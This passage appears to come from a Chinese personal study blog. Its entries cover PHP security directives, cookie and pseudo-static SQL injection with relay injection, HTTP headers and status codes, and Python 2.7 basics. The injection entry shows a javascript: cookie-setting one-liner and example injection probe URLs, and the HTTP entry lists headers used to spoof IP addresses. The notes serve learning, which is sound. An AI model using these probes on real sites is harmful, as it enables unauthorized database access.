<li><strong>safe_mode_gid</strong>：默认”0”。安全模式在打开文件时会做 UID 比较检查。如果想将其放宽到 GID 比较，则打开 safe_mode_gid。</li>
<li><strong>safe_mode_include_dir</strong>：默认为NULL。当从此目录及其子目录（目录<strong>必须</strong>在 include_path 中 或者 用完整路径来包含）包含文件时越过 UID/GID 检查。 </li>
</ul>
<blockquote>
<p>从 PHP 4.2.0 开始，本指令可以接受和 include_path 指令类似的风格用冒号（Windows 中是分号）隔开的路径，而不只是一个目录。 指定的限制实际上是一个前缀，而非一个目录名，目录名需要以/结尾。<br>“safe_mode_include_dir = /dir/incl” 将允许访问 “/dir/include”和“/dir/incls”等文件<br>“safe_mode_include_dir = /dir/incl/” 将允许访问 “/dir/incl/”目录下的文件<br>如果本指令的值为空，在 PHP 4.2.3 中以及 PHP 4.3.3 起具有不同 UID/GID 的文件将不能被包含。在较早版本中，所有文件都能被包含。 </p>
<p><strong>include_path</strong> :范围是 PHP_INI_ALL。 默认”.;/path/to/php/pear”<br>作用：指定一个目录列表，让require、include、fopen（）、file（）、readfile（）和file_get_contents（）函数从中查找文件。该格式类似于系统的PATH环境变量：在Unix中使用冒号(:)分隔的目录列表或在Windows中使用分号(;)。<br>修改： set_include_path()</p>
</blockquote>
<ul>
<li><strong>safe_mode_exec_dir</strong>：默认””。如果 PHP 使用了安全模式，system() 和其它程序执行函数（见文末）将拒绝启动不在此目录中的程序。必须使用 / 作为目录分隔符，包括 Windows 中。 </li>
<li><strong>safe_mode_allowed_env_vars</strong>：默认为”PHP<em>“。设置某些环境变量可能是潜在的安全缺口。本指令包含有一个逗号分隔的前缀列表。在安全模式下，用户只能改变那些名字具有在这里提供的前缀的环境变量。默认情况下，用户只能设置以 PHP</em> 开头的环境变量（例如 PHP_FOO = BAR）。</li>
</ul>
<blockquote>
<p>如果本指令为空，PHP 将使用户可以修改任何环境变量！ </p>
</blockquote>
<ul>
<li><strong>safe_mode_protected_env_vars</strong>：默认为”LD_LIBRARY_PATH”。本指令包含有一个逗号分隔的环境变量的列表，最终用户不能用 putenv() 来改变这些环境变量。甚至在 safe_mode_allowed_env_vars 中设置了允许修改时也不能改变这些变量。 </li>
</ul>
<blockquote>
<p>putenv（） — 设置环境变量的值<br>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。<br>如：putenv(“UNIQID=$uniqid”);<br>getenv（） — 得到环境变量的值<br><strong>putenv/getenv、$_ENV、phpinfo（INFO_ENVIRONMENT） 三者变量完全隔离不会互相影响</strong></p>
</blockquote>
<h3 id="影响函数"><a href="#影响函数" class="headerlink" title="影响函数"></a>影响函数</h3><p>以下函数只做大致了解，知道其大致作用。<br>文件操作函数</p>
<pre><code>apache_request_headers — 获取当前请求的所有请求头信息 
fopen — 打开文件或者 URL
header — 发送原生 HTTP 头
dl — 运行时载入一个 PHP 扩展
link — 建立一个硬连接
file — 把整个文件读入一个数组中
chdir — 改变目录，将 PHP 的当前目录改为 directory。 
chgrp — 改变文件所属的组
chmod — 改变文件模式
chown — 改变文件的所有者
copy — 拷贝文件
rename — 重命名一个文件或目录
popen — 打开进程文件指针
mkdir — 创建目录
rmdir — 删除目录
touch — 设定文件的访问和修改时间
dbase_open — 打开一个数据库
dba_open — 打开一个数据库
filepro等 — 有关映射文件函数
putenv — 设置环境变量的值
......过多不列举
</code></pre><p>程序执行函数：</p>
<pre><code>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数
escapeshellcmd — shell 元字符转义
exec — 执行一个外部程序
passthru — 执行外部程序并且显示原始输出
proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码
proc_get_status — 获取由 proc_open 函数打开的进程的信息
proc_nice — 修改当前进程的优先级
proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。
proc_terminate — 杀除由 proc_open 打开的进程
shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
system — 执行外部程序，并且显示输出
</code></pre><h2 id="open-basedir-PHP可访问目录"><a href="#open-basedir-PHP可访问目录" class="headerlink" title="open_basedir PHP可访问目录"></a>open_basedir PHP可访问目录</h2><p>范围是 PHP_INI_ALL 。 默认是 NULL 是允许打开所有文件<br>在 PHP &lt; 5.3.0 时是 PHP_INI_SYSTEM<br><strong>作用</strong>：open_basedir 将能打开的文件限制在指定的目录树下。本指令不受安全模式打开或者关闭的影响。 </p>
<ul>
<li>特殊值<strong>.</strong> 指定脚本的工作目录被作为基准目录。但是可以通过chdir来改变工作目录</li>
<li>指定的限制实际上是一个前缀，而非一个目录名，目录名需要以/结尾，与safe_mode_include_dir相同。</li>
<li>可以在httpd.conf中修改来关闭</li>
<li>在 Windows 中，用分号分隔目录。在任何其它系统中用冒号分隔目录</li>
</ul>
<h2 id="display-errors-和-error-reporting"><a href="#display-errors-和-error-reporting" class="headerlink" title="display_errors 和 error_reporting"></a>display_errors 和 error_reporting</h2><p><a href="http://php.net/manual/zh/errorfunc.configuration.php#ini.error-reporting" target="_blank" rel="external">官网详情</a><br>两者范围都是 <strong>PHP_INI_ALL</strong><br>display_errors 默认为 On 。 error_reporting 默认为 NULL<br><strong>display_errors作用</strong>：该选项设置是否将错误信息作为输出的一部分显示到屏幕，或者对用户隐藏而不显示。<br>还可以设置 “display=stderr” 表示发送到 stderr 而不是 stdout。(只影响CGI/CLI的二进制文件)<br>“stderr”从 PHP 5.2.4 开始可用。在以前的版本中，该配置值的类型为 boolean. </p>
<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb9178typj30fu05t74j.jpg" alt="13.png"><br></div>

<p>当 display_errors=On 时，可以设置error_reporting</p>
<h3 id="error-reporting"><a href="#error-reporting" class="headerlink" title="error_reporting"></a>error_reporting</h3><p><strong>error_reporting的作用</strong>: 设置错误报告的级别。<br>该参数可以是一个任意的表示二进制位字段的整数，或者<a href="http://php.net/manual/zh/errorfunc.constants.php" target="_blank" rel="external">内置常量</a>配置。<br>在PHP 4和PHP 5之中，其默认值为 <code>E_ALL &amp; ~E_NOTICE</code>。 该设置表示除了 E_NOTICE 其他都显示的错误级别。</p>
<h2 id="其他安全常用指令"><a href="#其他安全常用指令" class="headerlink" title="其他安全常用指令"></a>其他安全常用指令</h2><table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">范围</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">expose_php</td>
<td style="text-align:center">php.ini only</td>
<td style="text-align:center">是否在服务器返回信息HTTP头显示PHP版本</td>
</tr>
<tr>
<td style="text-align:center">max_execution_time</td>
<td style="text-align:center">PHP_INI_ALL</td>
<td style="text-align:center">每个脚本做多执行秒数</td>
</tr>
<tr>
<td style="text-align:center">memory_limit</td>
<td style="text-align:center">PHP_INI_ALL</td>
<td style="text-align:center">每个脚本能够使用的最大内存数量</td>
</tr>
<tr>
<td style="text-align:center">log_errors</td>
<td style="text-align:center">PHP_INI_ALL</td>
<td style="text-align:center">将错误输入到日志文件</td>
</tr>
<tr>
<td style="text-align:center">log_errors_max_len</td>
<td style="text-align:center">PHP_INI_ALL</td>
<td style="text-align:center">设定log_errors的最大长度</td>
</tr>
<tr>
<td style="text-align:center">variables_order</td>
<td style="text-align:center">PHP_INI_PERDIR</td>
<td style="text-align:center">描述PHP注册GET、POST、Cookie、环境、内置变量的顺序，注册从左往右，新值会覆盖旧值</td>
</tr>
<tr>
<td style="text-align:center">post_max_size</td>
<td style="text-align:center">PHP_INI_PERDIR</td>
<td style="text-align:center">PHP可以接受的最大POST数据大小</td>
</tr>
<tr>
<td style="text-align:center">auto_prepend_file</td>
<td style="text-align:center">PHP_INI_PERDIR</td>
<td style="text-align:center">在任何PHP文档之前自动包含的文件</td>
</tr>
<tr>
<td style="text-align:center">auto_append_file</td>
<td style="text-align:center">PHP_INI_PERDIR</td>
<td style="text-align:center">在任何PHP文档之后自动包含的文件</td>
</tr>
<tr>
<td style="text-align:center">extension_dir</td>
<td style="text-align:center">PHP_INI_SYSTEM</td>
<td style="text-align:center">可加载的扩展（模块）的目录位置</td>
</tr>
<tr>
<td style="text-align:center">file_uploads</td>
<td style="text-align:center">PHP_INI_SYSTEM</td>
<td style="text-align:center">是否允许HTTP文件上传</td>
</tr>
<tr>
<td style="text-align:center">upload_tmp_dir</td>
<td style="text-align:center">PHP_INI_SYSTEM</td>
<td style="text-align:center">对于HTTP上传文件的临时文件目录</td>
</tr>
<tr>
<td style="text-align:center">upload_max_filesize</td>
<td style="text-align:center">PHP_INI_SYSTEM</td>
<td style="text-align:center">允许上传的最大文件大小</td>
</tr>
</tbody>
</table>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-Cookie注入与伪静态注入]]></title>
      <url>/2018/02/26/WEB-Cookie%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>—  从零开始的笔记  —<br>— cookie 伪静态 中转 —<br><a id="more"></a></p>
<hr>
<p>因为cookie注入与伪静态注入都可以利用到中转注入，所以合在一起说明了<br>但是对于中转注入的编写，还停留在工具上，并没有自己实践编写，所以这里只是简单提一下。</p>
<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一开始看到教程一大篇，以为很高端….结果….还是属于sql注入，而且emmmm很极端啊= =<br>asp设计的特性使之更容易出现在<code>.ASP</code>文件中</p>
<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul>
<li>服务器使用客户端传递的参数时候，使用的是<code>Request</code>对象</li>
<li>专门检查了<code>Request.QueryString</code>与<code>Request.form</code>中的参数，没有专门检查<code>Request.Cookies</code>中的参数</li>
<li>使用参数时，没有详细区分，使用<code>Request(&quot;参数名称&quot;)</code></li>
</ul>
<p><code>REQUEST</code>：ASP脚本中的request对象。它被用于从用户那里获取信息。<br>Request对象的通常使用：<strong>request.[集合名称]（参数名称）</strong><br>如 <strong>request.form(“参数名称”)</strong><br>但是request集合名称可以<strong>省略</strong>，即可以省略from<br>若省略，ASP规定是按QueryString（GET）、Form（POST）、Cookies、ServerVariables（服务器变量）的顺序来获取数据的。<br>所以request(“id”)，程序员实际是想从get或者post中获取，但事实是也可以从cookie中获取，而request.Cookies并没有被过滤，从而导致Cookie注入</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>极其简单，把原来在GET或POST中的参数写到cookie中就可以了<br>大多数手注教程中都在地址栏中填入类似的js脚本来修改Cookie（自己在火狐浏览器中实践时，浏览器会吞掉 javascript: 需手打）<br><code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;payload&quot;));</code></p>
<ul>
<li>alert()：弹出窗口</li>
<li>document.cookie：缓存在本地的Cookies</li>
<li>=：实际为添加Cookie不是覆盖全部</li>
<li>escape：编码，防止乱码</li>
</ul>
<p>实际上burpsuite 抓包修改cookie,再<strong>URL编码</strong>，即可</p>
<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><h3 id="伪静态技术"><a href="#伪静态技术" class="headerlink" title="伪静态技术"></a>伪静态技术</h3><p>伪静态页面技术：把动态页面的地址转换成以htm或html结尾的地址，看起来是静态的，实际是依然是动态页面。<br>通常分为两种形式:</p>
<ul>
<li>框架伪静态：动态内容链入主框架页面。整个网页URL是一样的。</li>
<li>利用组件把asp、aspx、php等后缀及参数隐藏，显示为htm或html。可以通过访问源页面</li>
</ul>
<p>伪静态技术的优点：</p>
<ul>
<li>防止sql注入，隐藏参数，或转变参数使其不容易被直接发现</li>
<li>为了SEO（搜索引擎优化）方便检测抓取，搜索引擎一般不去抓取<strong>?</strong>之后的内容</li>
</ul>
<h3 id="伪静态实现方法"><a href="#伪静态实现方法" class="headerlink" title="伪静态实现方法"></a>伪静态实现方法</h3><p>1.PHP的pathinfo实现：利用pathinfo()函数解析url，然后重构<br>原URL：<code>http://localhost/index.php?m=Index&amp;a=test</code><br>转化URL：<code>http://localhost/index.php/Index/test</code><br>2.web服务器apache实现：可自己设计，隐藏掉页面名称</p>
<h3 id="伪静态的apache实现"><a href="#伪静态的apache实现" class="headerlink" title="伪静态的apache实现"></a>伪静态的apache实现</h3><p>利用 Apache的URL重写（mod_rewrite）功能映射。<br><a href="http://blog.csdn.net/qq_16241043/article/details/54176442" target="_blank" rel="external">详细操作</a></p>
<p>真实页面<code>bbs.itcast.cn/index.php?m=article&amp;id=1</code><br>URL显示页面<code>bbs.itcast.cn/news/1.html</code><br><strong>Apache 的伪静态规则：</strong><br><code>RewriteRule ^news/([0-9]+)\.html$ index.php?m=article&amp;id=$1 [L]</code>     </p>
<ul>
<li><strong>RewriteRule</strong>：固定开头</li>
<li><strong>^news/([0-9]+).html$</strong>：这部分是匹配当前的url地址, 也就是伪静态的地址</li>
<li><strong>[0-9]+</strong>：表示至少有1个数字,可以是0也可以是无限大</li>
<li><strong>index.php?m=article&amp;id=$1</strong>：这里是指向对应的真实地址</li>
<li><strong>$1</strong>：配对上面的第一个括号, $2匹配第二个以此类推</li>
<li><strong>[L]</strong>：L意思是如果此规则匹配,则停止,不在匹配后面的,减少无必要查询 。</li>
</ul>
<h3 id="伪静态注入-1"><a href="#伪静态注入-1" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>伪静态的注入和URL的普通GET注入不太相同。<br>普通url的get注入的%20(空格),%23(#),+等都可以用；但是伪静态不行，会被直接传递到到url中。<br>另外用/**/这个注释符号表示空格。</p>
<pre><code>http://www.XXXXX.com/vote /5453′/1 报错，
http://www.XXXXX.com/vote/5453-0/1 返回正常游戏名字 （使用-号，是因为+号会被当做url编码）
http://www.2cto.com /vote/5453-1/1 返回5452的游戏名字，判断存在注入点

http://www.xxx.com/page/html/56&apos;/**/and/**/1=1/*.html 正常
http://www.xxx.com/page/html/56&apos;/**/and/**/1=2/*.html 出错
</code></pre><p>之后按照正常套路注入</p>
<h2 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h2><p>所谓<code>中转注入</code>即在目标与本机之间建立第三方服务器来中转攻击。<br>可以是在本地建立一个网站，访问本地网站，让这个网站去访问目标网站然后返回访问结果。</p>
<p>中转注入在COOKIE注入与伪静态注入中适用的地方在于可以<strong>方便简化注入的步骤</strong></p>
<ul>
<li>在<strong>COOKIE注入</strong>中，可以用自己建立的网站来转化GET参数为COOKIE，构造访问请求发送给目标网站,之后只在自己建立的网站中修改get参数即可</li>
<li>在<strong>伪静态注入</strong>中，可以用自己建立的网站来转变URL把对方静态页面的参数再转变为<strong>?参数=值</strong>的形式，之后只在自己建立的网站中输入get参数即可。</li>
</ul>
<p>接下来就只要访问自己建立的网站就可以进行下一步攻击。另外有ASP的注入中转生成器可以利用。</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-HTTP基础]]></title>
      <url>/2018/01/30/WEB-HTTP%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p>— 从零开始的笔记 —<br>— HTTP基础知识 —<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>emmm…终于系统地整理了一下经常看到但是没有去好好了解的HTTP的东西，那么开始。</p>
<h2 id="HTTP结构"><a href="#HTTP结构" class="headerlink" title="HTTP结构"></a>HTTP结构</h2><p><strong>请求结构</strong>：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3ly1fnyr3e08oej30hs0a0t9n.jpg" alt=""><br>HTTP版本有两种：1.0 和 1.1<br>我们需要注意到的差异是 1.1版本请求必须使用HOST请求消息头</p>
<p><strong>响应结构</strong>：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3ly1fnyr3vkg2ej30hs0b2wfo.jpg" alt=""></p>
<h2 id="常用HTTP消息头部"><a href="#常用HTTP消息头部" class="headerlink" title="常用HTTP消息头部"></a>常用HTTP消息头部</h2><p>先给出一些通用的消息头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Connection：HTTP传输后是关闭TCP链接，还是保持链接开放</div><div class="line">Content-Length：消息主体字节长度</div><div class="line">Content-Type：消息主体内容类型；HTML文档内容类型为text/html</div><div class="line">Content-Encoding：为消息主体内容指定编码形式（如gzip）；一些应用使用它来压缩主体，以加快传输速度</div><div class="line">Transfer-Encoding：为方便通过HTTP传输而对消息主体使用的任何编码。使用这个消息头，通常用它指定块编码</div></pre></td></tr></table></figure></p>
<h2 id="HTTP请求消息头部"><a href="#HTTP请求消息头部" class="headerlink" title="HTTP请求消息头部"></a>HTTP请求消息头部</h2><p>下面开始说明HTTP请求消息部分，先从消息头部开始：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">User-Agent:UA,用户代理，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</div><div class="line">Referer：表示发出请求的原始URL，跳转</div><div class="line">Host：想访问的WEB服务器的域名/IP 地址和端口号</div><div class="line">Accept：客户端可以处理的媒体类型，按优先级排序；在一个以逗号为分隔的列表中，可以定义多种类型和使用通配符。</div><div class="line">Accept-Charset：客户端接收的字符集</div><div class="line">Accept-Encoding: 客户端愿意接受哪些内容编码</div><div class="line">Authorization：用于为一种内置HTTP身份验证向服务器提交证书</div><div class="line">Cookie：提交服务器向客户端发布的其他参数</div><div class="line">If-Modified-Since:用于说明浏览器最后一收到所请求的资源的时间。如果服务器判断资源没有发生变化，就会发送状态码304响应，是客户端使用缓存的资源副本</div><div class="line">If-None-Match：指定一个实体标签——消息主体内容的标识符；服务器可以使用实体标签确定浏览器是否使用资源的缓冲副本</div></pre></td></tr></table></figure></p>
<h3 id="User-Agent延伸"><a href="#User-Agent延伸" class="headerlink" title="User-Agent延伸"></a>User-Agent延伸</h3><p><a href="http://blog.csdn.net/u012175089/article/details/61199238" target="_blank" rel="external">补充参考1</a> <a href="http://blog.csdn.net/bone_ace/article/details/52476016" target="_blank" rel="external">补充参考2</a><br>IOS6系统格式：<br><code>User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25</code><br>safari5.1–Windows格式：<br><code>User-Agent: Mozilla/5.0(Windows;U;WindowsNT6.1;en-us)AppleWebKit/534.50(KHTML,likeGecko)Version/5.1Safari/534.50</code></p>
<h3 id="伪造IP的HTTP请求头："><a href="#伪造IP的HTTP请求头：" class="headerlink" title="伪造IP的HTTP请求头："></a>伪造IP的HTTP请求头：</h3><p>X-Forwarded-For<br>Client-IP<br>x-remote-IP<br>x-originating-IP<br>x-remote-addr</p>
<h2 id="HTTP请求头方法"><a href="#HTTP请求头方法" class="headerlink" title="HTTP请求头方法"></a>HTTP请求头方法</h2><pre><code>GET：获取资源，
POST：传输实体内容，之后细说
PUT：上传文件，传输文件到请求URL的位置。自身不带验证机制，存在安全性问题，需要关注。
DELETE：删除文件，删除请求URL位置的文件，与上同
HEAD：返回和GET一样的头，不返回主体；用于检查某一资源是否存在
TRACE：返回服务器接受到的请求头；用于检测客户端与服务器之间是否存在任何操纵请求的代理服务器
    有Max-Forward首字段：可以控制生存时间STEP
CONNECT：链接至HTTP代理服务器，[详细说明](http://blog.csdn.net/kobejayandy/article/details/24606521)
OPTIONS：返回服务器对特定资源可用的HTTP方法
</code></pre><h3 id="POST方法的Content-Type的常用四种形式"><a href="#POST方法的Content-Type的常用四种形式" class="headerlink" title="POST方法的Content-Type的常用四种形式"></a>POST方法的Content-Type的常用四种形式</h3><p>通过HTNL的Form表单的Enctype属性指定使用的常用四种形式<br>application/x-www-form-urlencoded<br>multipart/form-data<br>application/json<br>text/xml<br>除此以外还有<br>application/x-java-serialized-object ： java序列化<br>application/x-amf：Flash序列化<br>application/soap+msbin1：Silverlight序列化</p>
<h4 id="application-x-www-form-urlencoded-："><a href="#application-x-www-form-urlencoded-：" class="headerlink" title="application/x-www-form-urlencoded ："></a>application/x-www-form-urlencoded ：</h4><p>数据被编码为名称/值对</p>
<pre><code>POST http://www.example.com HTTP/1.1
Content-Type: application/x-www-form-urlencoded;charset=utf-8

title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3 
</code></pre><h4 id="multipart-form-data-："><a href="#multipart-form-data-：" class="headerlink" title="multipart/form-data ："></a>multipart/form-data ：</h4><p>可以使一块内容进行不同的编码形式<br>格式：Content-Type:multipart/form-data; boundary=（+随机的分割字符串）</p>
<pre><code>POST http://www.example.com HTTP/1.1
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA

------WebKitFormBoundaryrGKCBY7qhFd3TrwA
Content-Disposition: form-data; name=&quot;text&quot;

title
------WebKitFormBoundaryrGKCBY7qhFd3TrwA
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;
Content-Type: image/png

PNG ... content of chrome.png ...
------WebKitFormBoundaryrGKCBY7qhFd3TrwA-- 
</code></pre><p>分割开头多<code>--</code> 最后一个结尾多<code>--</code></p>
<h4 id="application-json-："><a href="#application-json-：" class="headerlink" title="application/json ："></a>application/json ：</h4><p>主体是序列化后的 JSON 字符串</p>
<pre><code>POST http://www.example.com HTTP/1.1
Content-Type: application/json;charset=utf-8

{&quot;title&quot;:&quot;test&quot;,&quot;sub&quot;:[1,2,3]} 
</code></pre><h4 id="text-xml-："><a href="#text-xml-：" class="headerlink" title="text/xml ："></a>text/xml ：</h4><p>以纯文本形式进行编码，其中不含任何控件或格式字符。 </p>
<pre><code>POST http://www.example.com HTTP/1.1
Content-Type: text/xml

&lt;!--?xml version=&quot;1.0&quot;?--&gt;
&lt;methodcall&gt;
    &lt;methodname&gt;examples.getStateName&lt;/methodname&gt;
    &lt;params&gt;
        &lt;param&gt;
            &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt;

    &lt;/params&gt;
&lt;/methodcall&gt; 
</code></pre><h2 id="HTTP响应消息头部"><a href="#HTTP响应消息头部" class="headerlink" title="HTTP响应消息头部"></a>HTTP响应消息头部</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Server：指明WEB服务器软件</div><div class="line">Set-Cookie：发送一个cookie，分号分割，它将在随后向服务器发送的请求汇总由Cookie消息头返回</div><div class="line">	可选属性：</div><div class="line">	expires：设定cookie有效时间。使浏览器将cookie保存在永久性的存储器中，在随后的的浏览器会话中重复利用，直到到期。</div><div class="line">	domain：用于指定cookie有效域。这个域必须和收到cookie的域相同或者是它的父域</div><div class="line">	path：用于指定cookie的有效url路径</div><div class="line">	secure：设置，仅仅只在HTTPS请求中提交cookie</div><div class="line">	HttpOnly：无法通过客户端JS直接访问cookie</div><div class="line">Pragma：主要用于no-cache，浏览器不要将响应保存在缓存中</div><div class="line">Cache-Control：设置是否要缓存，及缓存的设置</div><div class="line">Expired：WEB服务器表明该实体将在什么时候过期</div><div class="line">ETag：指定一个实体标签，标志为实体的版本</div><div class="line">Location：服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。</div></pre></td></tr></table></figure>
<h2 id="HTTP响应返回状态码"><a href="#HTTP响应返回状态码" class="headerlink" title="HTTP响应返回状态码"></a>HTTP响应返回状态码</h2><ul>
<li>1XX——提供信息</li>
<li>2XX——请求被成功提交</li>
<li>3XX——客户端被重定向到其他资源</li>
<li>4XX——请求包含某种错误</li>
<li>5XX——服务器执行请求是遇到错误</li>
</ul>
<pre><code>100 Continue——当客户端发送包含主体的请求，服务端返回100，表示已经收到请求消息头，让客户端继续发送主体。

200 OK——已经成功提交请求，且响应主体中包含请求的结果。
201 Created——PUT请求的响应返回状态码，表示请求已成功提交

301 Moved Permanently——重定向到Location消息头中指定的URL，以后客户端应用新的URL替换原始的URL
302 Found——暂时重定向到Location消息头中指定的URL，随后请求中恢复使用原始URL
304 Not Modified——指示浏览器使用缓存中保存的所请求资源的副本。

400 Bad Request——表示客户端提交了一个无效的HTTP请求。
401 Unauthorized——服务器在许可请求前要求HTTP进行身份验证。身份验证类型在消息头WWW-Authenticate中说明
403 Forbidden——不管是否通过身份验证，禁止任何人访问被请求的资源
404 Not Found——所请求的资源不存在
405 Method Not Allowed——URL不支持请求中使用的方法，如不支持PUT
413 Request Entity Too Large——表示请求主体过长，服务器无法处理
414 Request URI Too long——表示请求中URL过长，服务器无法处理

500 InternalServer Error——表示服务器在执行请求时遇到错误。
503 Service Unavailable——尽管WEB服务器运转正常，能够响应请求，但是服务器访问的应用程序无法做出响应。
</code></pre><h2 id="HTTP身份验证"><a href="#HTTP身份验证" class="headerlink" title="HTTP身份验证"></a>HTTP身份验证</h2><p>在组织内部经常使用来访问内联网服务，但因特网上的Web应用程序很少使用</p>
<ul>
<li><strong>Basic</strong>： 在请求消息头中，用户证书以Base64的形式编码发送服务器</li>
<li><strong>NTLM</strong>：  质询-响应式机制，使用某个windows NTLM协议版本</li>
<li><strong>Digest</strong>： 质询-响应式机制，随同用户证书一起使用一个随机值MD5校验和。</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python2.7笔记]]></title>
      <url>/2018/01/25/python%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>……好好学习了下python2.7.放笔记放笔记<br><a id="more"></a></p>
<h2 id="输入输出及NULL"><a href="#输入输出及NULL" class="headerlink" title="输入输出及NULL"></a>输入输出及NULL</h2><p>输入  <code>raw_input(&quot;输入提示&quot;)</code><br>输出  <code>print</code><br>python的NULL <code>None</code></p>
<h2 id="函数导入"><a href="#函数导入" class="headerlink" title="函数导入"></a>函数导入</h2><p>4种导入方式<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pandas</div><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd <span class="comment">#重命名为pd</span></div><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> funtion1</div></pre></td></tr></table></figure></p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul>
<li><strong>没有++ –</strong></li>
<li>算数运算符 + - <em> / % *</em> //(表示整数除法，/在3.0只能表示浮点数除法)</li>
<li>关系运算符 == != &lt; &gt; &lt;= &gt;= &lt;&gt;(在3.0已经被淘汰 )</li>
<li>逻辑运算符 and or not (没有|| &amp;&amp;)</li>
<li>位运算符    &amp; | ^ ~ &lt;&lt; &gt;&gt;</li>
<li>成员运算符 in  not in (判断是否包含)</li>
<li>身份运算符 is  not is (判断地址是否相同)</li>
</ul>
<h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><table>
<thead>
<tr>
<th style="text-align:center">符号</th>
<th style="text-align:center">意思</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"> **</td>
<td style="text-align:center">指数 (最高优先级)</td>
</tr>
<tr>
<td style="text-align:center"> ~ + -</td>
<td style="text-align:center">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td>
</tr>
<tr>
<td style="text-align:center"> * / % //</td>
<td style="text-align:center">乘，除，取模和取整除</td>
</tr>
<tr>
<td style="text-align:center"> + -</td>
<td style="text-align:center">加法减法</td>
</tr>
<tr>
<td style="text-align:center"> &gt;&gt; &lt;&lt;</td>
<td style="text-align:center">右移，左移运算符</td>
</tr>
<tr>
<td style="text-align:center"> &amp;</td>
<td style="text-align:center">位 ‘AND’</td>
</tr>
<tr>
<td style="text-align:center"> ^ ｜</td>
<td style="text-align:center">位运算符</td>
</tr>
<tr>
<td style="text-align:center"> &lt;= &lt; &gt; &gt;=</td>
<td style="text-align:center">比较运算符</td>
</tr>
<tr>
<td style="text-align:center"> &lt;&gt; == !=</td>
<td style="text-align:center">等于运算符</td>
</tr>
<tr>
<td style="text-align:center"> = %= /= //= -= += <em>= *</em>=</td>
<td style="text-align:center">赋值运算符</td>
</tr>
<tr>
<td style="text-align:center"> is is not</td>
<td style="text-align:center">身份运算符</td>
</tr>
<tr>
<td style="text-align:center"> in not in</td>
<td style="text-align:center">成员运算符</td>
</tr>
<tr>
<td style="text-align:center"> not or and</td>
<td style="text-align:center">逻辑运算符</td>
</tr>
</tbody>
</table>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="数字变量"><a href="#数字变量" class="headerlink" title="数字变量"></a>数字变量</h3><p>类型：<strong>int long bool float complex(复数)</strong><br>long 不固定长度，受限于虚拟内存</p>
